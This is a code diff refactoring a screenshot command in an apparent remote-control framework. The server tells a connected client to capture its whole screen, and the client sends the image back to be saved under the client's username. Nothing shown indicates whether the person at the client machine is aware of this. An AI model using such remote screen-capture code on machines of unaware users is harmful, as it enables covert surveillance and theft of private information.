@@ -17,19 +17,19 @@ def execute(netServer: "NetterServer", *args) -> bool:
         netServer.inputHandler.handle('help screenshot') # Sends usage information of this command
         return False
 
-    client: NetterServer = netServer.selectedClient if netServer.selectedClient is not None else \
+    client: "NetterClient" = netServer.selectedClient if netServer.selectedClient is not None else \
         netServer.get(UUID = args[0])
 
     if (client is None):
         netServer.console_log('Provided clinet does not exists.', level = 'ERROR')
         return False
 
-    netServer.selectedClient.socket_.send_(
+    client.socket_.send_(
         packetType = PacketType.COMMAND,
         data = 'screenshot'
     )
 
-    return True
+    return client
 
 def on_server_receive(netServer: "NetterServer", client: "NetterClient", packet: "ClientResponse") -> None:
     with open(f'{client.username}T{time.time()}.jpeg', 'wb') as file:
@@ -37,11 +37,12 @@ def on_server_receive(netServer: "NetterServer", client: "NetterClient", packet:
 
     netServer.console_log(f'Screenshot saved as {client.username}T{time.time()}.jpeg', level = 'INFO')
 
-def on_client_receive(serverHandler: "Connect") -> None:
+def on_client_receive(serverHandler: "Connect") -> str | bytes:
     from PIL import ImageGrab
 
     image = ImageGrab.grab().convert('RGB')
     byteArray = io.BytesIO()
 
     image.save(byteArray, format = 'jpeg')
-    serverHandler.send_(packetType = PacketType.COMMAND_RESPONSE, data = byteArray.getvalue())
+
+    return byteArray.getvalue()
